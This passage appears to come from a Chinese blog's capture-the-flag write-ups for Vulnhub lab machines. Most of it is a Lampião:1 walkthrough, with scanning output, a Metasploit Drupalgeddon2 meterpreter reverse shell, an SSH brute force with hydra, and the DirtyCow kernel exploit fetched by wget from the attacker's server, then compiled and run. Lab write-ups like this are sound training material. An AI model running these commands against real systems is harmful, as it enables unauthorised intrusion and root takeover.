whoami<br>root<br>root@W1R3S:~# id<br>uid=0(root) gid=0(root) groups=0(root)<br></code></pre></td></tr></table></figure><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>1、ftp：信息泄露</p><p>2、web-cms：shell、内核漏洞、提权（成熟）</p><p>3、Linux-john：密码破解（弱）；在线、kali还有</p><h2 id="五、其他"><a href="#五、其他" class="headerlink" title="五、其他"></a>五、其他</h2><p><strong>Linux ：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 1、linux用户：root、系统用户、一般用户、www-data</span><br><span class="hljs-meta">#</span><span class="bash"> 2、Linux shell：</span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-variable">$SHELL</span></span><br><span class="hljs-meta">$</span><span class="bash"> cat /etc/shells</span><br><span class="hljs-meta">#</span><span class="bash"> 3、Linux 字典：</span><br><span class="hljs-meta">$</span><span class="bash"> cat /usr/share/wordlists</span><br><span class="hljs-meta">#</span><span class="bash"> 4、nikto</span><br></code></pre></td></tr></table></figure><p><strong>kali 常用命令：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(kali㉿kali)-[~]<br>└─$ whoami<br>kali<br><br>┌──(kali㉿kali)-[~]<br>└─$ id<br>uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),117(bluetooth),120(wireshark),134(scanner),142(kaboxer)<br><br>┌──(kali㉿kali)-[~]<br>└─$ sudo id<br>[sudo] password for kali: <br>uid=0(root) gid=0(root) groups=0(root),4(adm),20(dialout),120(wireshark),142(kaboxer)<br><br>┌──(kali㉿kali)-[~]<br>└─$ sudo cat /etc/sudoers                                                                                   <br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash"><span class="hljs-comment"># This file MUST be edited with the &#x27;visudo&#x27; command as root.</span></span><br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash"><span class="hljs-comment"># Please consider adding local content in /etc/sudoers.d/ instead of</span></span><br><span class="hljs-meta">#</span><span class="bash"> directly modifying this file.</span><br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash"><span class="hljs-comment"># See the man page for details on how to write a sudoers file.</span></span><br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash">Defaults        env_reset</span><br>Defaults        mail_badpass<br>Defaults        secure_path=&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> Host <span class="hljs-built_in">alias</span> specification</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> User <span class="hljs-built_in">alias</span> specification</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> Cmnd <span class="hljs-built_in">alias</span> specification</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> User privilege specification</span><br>root    ALL=(ALL:ALL) ALL<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> Allow members of group sudo to execute any <span class="hljs-built_in">command</span></span><br><span class="hljs-meta">%</span><span class="bash">sudo   ALL=(ALL:ALL) ALL</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> See sudoers(5) <span class="hljs-keyword">for</span> more information on <span class="hljs-string">&quot;@include&quot;</span> directives:</span><br><br>@includedir /etc/sudoers.d<br><br>┌──(kali㉿kali)-[~]<br>└─$ sudo -l<br>[sudo] password for kali: <br>Matching Defaults entries for kali on kali:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User kali may run the following commands on kali:<br>    (ALL : ALL) ALL<br><br>┌──(kali㉿kali)-[~]<br>└─$ sudo su     <br><br>┌──(root💀kali)-[/home/kali]<br>└─# id<br>uid=0(root) gid=0(root) groups=0(root),4(adm),20(dialout),120(wireshark),142(kaboxer)<br><br>┌──(kali㉿kali)-[~]<br>└─$ lsb_release -a<br>No LSB modules are available.<br>Distributor ID: Kali<br>Description:    Kali GNU/Linux Rolling<br>Release:        2021.3<br>Codename:       kali-rolling<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Penetration</tag>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lampião：1</title>
    <link href="/2022/04/30/Penetration/Vulnhub/Part-1/0x01%20Lampi%C3%A3o/"/>
    <url>/2022/04/30/Penetration/Vulnhub/Part-1/0x01%20Lampi%C3%A3o/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-Lampiao-1-vulnhub"><a href="#0x01-Lampiao-1-vulnhub" class="headerlink" title="0x01 Lampião: 1~vulnhub"></a>0x01 Lampião: 1~vulnhub</h1><blockquote><p>靶机地址：<a href="https://www.vulnhub.com/entry/lampiao-1,249/">Lampião: 1 ~ VulnHub</a></p><p>环境信息：</p><ul><li>攻击机 IP：192.168.135.141</li><li>靶机 IP：192.168.135.144</li></ul></blockquote><h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h3><p><strong>nmap 命令：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24    <span class="hljs-comment"># 扫描该网段上活跃的主机</span></span><br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-30 05:15 EDT<br>Nmap scan report for 192.168.135.2<br>Host is up (0.0018s latency).<br>Nmap scan report for 192.168.135.141<br>Host is up (0.00040s latency).<br>Nmap scan report for 192.168.135.144<br>Host is up (0.0022s latency).<br>Nmap done: 256 IP addresses (3 hosts up) scanned in 4.72 seconds<br></code></pre></td></tr></table></figure><p><strong>netdiscover 命令：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo netdiscover -i eth0 -r 192.168.135.0/24</span><br> Currently scanning: Finished!   |   Screen View: Unique Hosts                                               <br> <br> 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240<br> _____________________________________________________________________________<br>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      <br> -----------------------------------------------------------------------------<br> 192.168.135.1   00:50:56:c0:00:08      1      60  VMware, Inc.<br> 192.168.135.2   00:50:56:eb:65:60      1      60  VMware, Inc.<br> 192.168.135.144 00:0c:29:8f:0b:be      1      60  VMware, Inc.<br> 192.168.135.254 00:50:56:e6:a4:73      1      60  VMware, Inc.<br></code></pre></td></tr></table></figure><p><strong>得到靶机 ip：192.168.135.144</strong></p><h3 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h3><p><strong>nmap 命令：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sS -sV -T5 -A -p- 192.168.135.144     <span class="hljs-comment"># 全端口扫描</span></span><br></code></pre></td></tr></table></figure><p><strong>简单的端口扫描：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -p- 192.168.135.144</span> <br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-30 05:35 EDT<br>Nmap scan report for 192.168.135.144<br>Host is up (0.0020s latency).<br>Not shown: 65532 closed ports<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>1898/tcp open  cymtec-port<br>MAC Address: 00:0C:29:8F:0B:BE (VMware)<br><br>Nmap done: 1 IP address (1 host up) scanned in 14.07 seconds<br></code></pre></td></tr></table></figure><p><strong>全面扫描：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -A -p- 192.168.135.144</span><br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-30 05:39 EDT<br>Nmap scan report for 192.168.135.144<br>Host is up (0.0043s latency).<br>Not shown: 65532 closed ports<br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   1024 46:b1:99:60:7d:81:69:3c:ae:1f:c7:ff:c3:66:e3:10 (DSA)<br>|   2048 f3:e8:88:f2:2d:d0:b2:54:0b:9c:ad:61:33:59:55:93 (RSA)<br>|   256 ce:63:2a:f7:53:6e:46:e2:ae:81:e3:ff:b7:16:f4:52 (ECDSA)<br>|_  256 c6:55:ca:07:37:65:e3:06:c1:d6:5b:77:dc:23:df:cc (ED25519)<br>80/tcp   open  http?<br>| fingerprint-strings: <br>|   NULL: <br>|     _____ _ _ <br>|     |_|/ ___ ___ __ _ ___ _ _ <br>|     \x20| __/ (_| __ \x20|_| |_ <br>|     ___/ __| |___/ ___|__,_|___/__, ( ) <br>|     |___/ <br>|     ______ _ _ _ <br>|     ___(_) | | | |<br>|     \x20/ _` | / _ / _` | | | |/ _` | |<br>|_    __,_|__,_|_| |_|<br>1898/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))<br>|_http-generator: Drupal 7 (http://drupal.org)<br>| http-robots.txt: 36 disallowed entries (15 shown)<br>| /includes/ /misc/ /modules/ /profiles/ /scripts/ <br>| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt <br>| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt <br>|_/LICENSE.txt /MAINTAINERS.txt<br>|_http-server-header: Apache/2.4.7 (Ubuntu)<br>|_http-title: Lampi\xC3\xA3o<br><br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 50.67 seconds<br></code></pre></td></tr></table></figure><p><strong>得到目标端口信息：</strong></p><div class="table-container"><table><thead><tr><th>PORT</th><th>STATE</th><th>SERVICE</th><th>其他</th></tr></thead><tbody><tr><td>22/tcp</td><td>open</td><td>ssh</td><td></td></tr><tr><td>80/tcp</td><td>open</td><td>http</td><td></td></tr><tr><td>1898/tcp</td><td>open</td><td>cymtec-port</td><td>Drupal 7</td></tr></tbody></table></div><h3 id="3、端口探测"><a href="#3、端口探测" class="headerlink" title="3、端口探测"></a>3、端口探测</h3><p><strong>22端口</strong></p><p>暂时未得到 username 和 password 的相关信息，无法使用 ssh</p><p><strong>80端口</strong></p><p>目录爆破无果</p><p><strong>1898端口</strong></p><p>进行目录爆破，得到 robots.txt：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirb http://192.168.135.144:1898</span><br><br>-----------------<br>DIRB v2.22    <br>By The Dark Raver<br>-----------------<br><br>START_TIME: Sat Apr 30 06:22:29 2022<br>URL_BASE: http://192.168.135.144:1898/<br>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt<br><br>-----------------<br><br>GENERATED WORDS: 4612                                                          <br><br>---- Scanning URL: http://192.168.135.144:1898/ ----<br>==&gt; DIRECTORY: http://192.168.135.144:1898/includes/<br>+ http://192.168.135.144:1898/index.php (CODE:200|SIZE:11469)<br>==&gt; DIRECTORY: http://192.168.135.144:1898/misc/<br>==&gt; DIRECTORY: http://192.168.135.144:1898/modules/<br>==&gt; DIRECTORY: http://192.168.135.144:1898/profiles/<br>+ http://192.168.135.144:1898/robots.txt (CODE:200|SIZE:2189)<br>==&gt; DIRECTORY: http://192.168.135.144:1898/scripts/<br>+ http://192.168.135.144:1898/server-status (CODE:403|SIZE:297)<br>==&gt; DIRECTORY: http://192.168.135.144:1898/sites/<br>==&gt; DIRECTORY: http://192.168.135.144:1898/themes/<br>+ http://192.168.135.144:1898/web.config (CODE:200|SIZE:2200)<br>+ http://192.168.135.144:1898/xmlrpc.php (CODE:200|SIZE:42)<br><br>---- Entering directory: http://192.168.135.144:1898/includes/ ----<br>(!) WARNING: Directory IS LISTABLE. No need to scan it.                        <br>    (Use mode &#x27;-w&#x27; if you want to scan it anyway)<br>    <br>-----------------<br><br>END_TIME: Sat Apr 30 06:22:34 2022<br>DOWNLOADED: 4612 - FOUND: 5<br></code></pre></td></tr></table></figure><p>进入 robots.txt，看到 CHANGELOG.txt，打开得知 CSM 框架及版本号：Drupal 7.54, 2017-02-01</p><p>可以在 MSF 上根据 Drupal 漏洞脚本进行权限获取（低权限）。</p><h2 id="二、权限获取"><a href="#二、权限获取" class="headerlink" title="二、权限获取"></a>二、权限获取</h2><h3 id="M1、Drupal漏洞"><a href="#M1、Drupal漏洞" class="headerlink" title="M1、Drupal漏洞"></a>M1、Drupal漏洞</h3><p>打开msf：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> msfconsole</span><br></code></pre></td></tr></table></figure><p>在 msf 中搜一下 payload：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">msf6 &gt; search drupal<br><br>Matching Modules<br>================<br><br><span class="hljs-meta">   #</span><span class="bash">  Name                                           Disclosure Date  Rank       Check  Description</span><br>   -  ----                                           ---------------  ----       -----  -----------<br>   0  exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution<br>   1  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection<br>   2  exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection<br>   3  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection<br>   4  exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution<br>   5  exploit/unix/webapp/drupal_restws_unserialize  2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE<br>   6  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration<br>   7  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution<br><br>Interact with a module by name or index. For example info 7, use 7 or use exploit/unix/webapp/php_xmlrpc_eval<br></code></pre></td></tr></table></figure><p>使用最新的、容易利用的1号payload，直接拿到服务器权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs shell">msf6 &gt; use 1<br>[*] No payload configured, defaulting to php/meterpreter/reverse_tcp<br>msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; show options<br><br>Module options (exploit/unix/webapp/drupal_drupalgeddon2):<br><br>   Name         Current Setting  Required  Description<br>   ----         ---------------  --------  -----------<br>   DUMP_OUTPUT  false            no        Dump payload command output<br>   PHP_FUNC     passthru         yes       PHP function to execute<br>   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]<br>   RHOSTS                        yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit<br>   RPORT        80               yes       The target port (TCP)<br>   SSL          false            no        Negotiate SSL/TLS for outgoing connections<br>   TARGETURI    /                yes       Path to Drupal install<br>   VHOST                         no        HTTP server virtual host<br><br><br>Payload options (php/meterpreter/reverse_tcp):<br><br>   Name   Current Setting  Required  Description<br>   ----   ---------------  --------  -----------<br>   LHOST  192.168.135.141  yes       The listen address (an interface may be specified)<br>   LPORT  4444             yes       The listen port<br><br><br>Exploit target:<br><br>   Id  Name<br>   --  ----<br>   0   Automatic (PHP In-Memory)<br><br><br>msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set RHOST 192.168.135.144<br>RHOST =&gt; 192.168.135.144<br>msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set RPORT 1898<br>RPORT =&gt; 1898<br>msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit<br><br>[*] Started reverse TCP handler on 192.168.135.141:4444 <br>[*] Running automatic check (&quot;set AutoCheck false&quot; to disable)<br>[+] The target is vulnerable.<br>[*] Sending stage (39282 bytes) to 192.168.135.144<br>[*] Meterpreter session 1 opened (192.168.135.141:4444 -&gt; 192.168.135.144:44758) at 2022-04-30 07:36:17 -0400<br><br>meterpreter &gt; uname -a<br>[-] Unknown command: uname<br>meterpreter &gt; id<br>[-] Unknown command: id<br>meterpreter &gt; pwd<br>/var/www/html<br>meterpreter &gt; <br></code></pre></td></tr></table></figure><p>成功拿到 session 会话，输入 shell 进入 shell 终端，再利用 python 获得一个 TTY 终端。</p><p>启动 shell：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> shell</span><br><span class="hljs-meta">$</span><span class="bash"> python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></code></pre></td></tr></table></figure><h3 id="M2、SSH爆破"><a href="#M2、SSH爆破" class="headerlink" title="M2、SSH爆破"></a>M2、SSH爆破</h3><p>正常访问1898 端口，发现隐藏目录 <code>http://192.168.31.35:1898/?q=node/2</code> ，里面有两个文件：audio.m4a、qrc.png</p><p>访问 <code>http://192.168.31.35:1898/audio.m4a</code>，获取到 <strong><code>username:tiago</code></strong></p><p>使用 cewl 对 <code>http://192.168.31.35:1898/?q=node/1</code> 站点生成字典：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cewl http://192.168.31.35:1898/?q=node/1 -w password.txt</span><br></code></pre></td></tr></table></figure><p>使用 hydra 进行爆破：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> hydra -l tiago -P password.txt 192.168.135.144 ssh</span><br></code></pre></td></tr></table></figure><p>得到 <strong><code>password:Virgulino</code></strong></p><p>进行ssh登录，得到一个低权限用户：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh tiago@192.168.135.144<br></code></pre></td></tr></table></figure><h2 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h2><h3 id="1、扫描内核漏洞"><a href="#1、扫描内核漏洞" class="headerlink" title="1、扫描内核漏洞"></a>1、扫描内核漏洞</h3><p>通过 python 开启本地 http 服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python -m SimpleHTTPServer 8888</span><br></code></pre></td></tr></table></figure><p>在刚刚获取的低权限用户中获取扫描脚本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wget http://192.168.135.141:8888/les.sh</span><br></code></pre></td></tr></table></figure><p>运行得到内核相关漏洞信息，发现可通过 DirtyCow 进行提权。</p><h3 id="2、内核漏洞提权"><a href="#2、内核漏洞提权" class="headerlink" title="2、内核漏洞提权"></a>2、内核漏洞提权</h3><p>查找 DirtyCow 提权脚本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit dirty</span><br>--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                                                                                               |  Path<br>--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br>Linux Kernel - &#x27;The Huge Dirty Cow&#x27; Overwriting The Huge Zero Page (1)                                                                       | linux/dos/43199.c<br>Linux Kernel - &#x27;The Huge Dirty Cow&#x27; Overwriting The Huge Zero Page (2)                                                                       | linux/dos/44305.c<br>Linux Kernel 2.6.22 &lt; 3.9 (x86/x64) - &#x27;Dirty COW /proc/self/mem&#x27; Race Condition Privilege Escalation (SUID Method)                           | linux/local/40616.c<br>Linux Kernel 2.6.22 &lt; 3.9 - &#x27;Dirty COW /proc/self/mem&#x27; Race Condition Privilege Escalation (/etc/passwd Method)                              | linux/local/40847.cpp<br>Linux Kernel 2.6.22 &lt; 3.9 - &#x27;Dirty COW PTRACE_POKEDATA&#x27; Race Condition (Write Access Method)                                                 | linux/local/40838.c<br>Linux Kernel 2.6.22 &lt; 3.9 - &#x27;Dirty COW&#x27; &#x27;PTRACE_POKEDATA&#x27; Race Condition Privilege Escalation (/etc/passwd Method)                           | linux/local/40839.c<br>Linux Kernel 2.6.22 &lt; 3.9 - &#x27;Dirty COW&#x27; /proc/self/mem Race Condition (Write Access Method)                                                  | linux/local/40611.c<br>Qualcomm Android - Kernel Use-After-Free via Incorrect set_page_dirty() in KGSL                                                              | android/dos/46941.txt<br>Quick and Dirty Blog (qdblog) 0.4 - &#x27;categories.php&#x27; Local File Inclusion                                                                    | php/webapps/4603.txt<br>Quick and Dirty Blog (qdblog) 0.4 - SQL Injection / Local File Inclusion                                                                     | php/webapps/3729.txt<br>snapd &lt; 2.37 (Ubuntu) - &#x27;dirty_sock&#x27; Local Privilege Escalation (1)                                                                          | linux/local/46361.py<br>snapd &lt; 2.37 (Ubuntu) - &#x27;dirty_sock&#x27; Local Privilege Escalation (2)                                                                          | linux/local/46362.py<br>--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br></code></pre></td></tr></table></figure><p>选择 40847.cpp 脚本并拷贝到当前目录下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cp /usr/share/exploitdb/exploits/linux/<span class="hljs-built_in">local</span>/40847.cpp ./</span><br></code></pre></td></tr></table></figure><p>通过 python 开启本地 http 服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python -m SimpleHTTPServer 8888</span><br></code></pre></td></tr></table></figure><p>在刚刚获取的低权限用户中获取该脚本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wget http://192.168.135.141:8888/40847.cpp</span><br></code></pre></td></tr></table></figure><p>进行编译、运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</span><br><span class="hljs-meta">$</span><span class="bash"> ./dcow</span><br></code></pre></td></tr></table></figure><ol><li>-Wall 一般使用该选项，允许发出GCC能够提供的所有有用的警告</li><li>-pedantic 允许发出ANSI/ISO 